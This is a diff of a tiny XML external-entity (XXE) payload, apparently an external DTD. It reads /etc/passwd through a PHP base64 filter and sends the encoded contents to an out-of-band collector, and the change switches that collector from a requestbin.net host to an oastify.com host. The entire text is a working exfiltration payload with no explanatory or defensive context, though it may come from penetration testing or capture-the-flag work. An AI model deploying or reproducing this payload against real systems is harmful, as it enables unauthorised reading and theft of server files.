@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://wlbh0veijelnlghi.b.requestbin.net/?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM '749mtx81bjwwt5rml1n3q0wxdoje73.oastify.com/?%file;'>">
 %all;
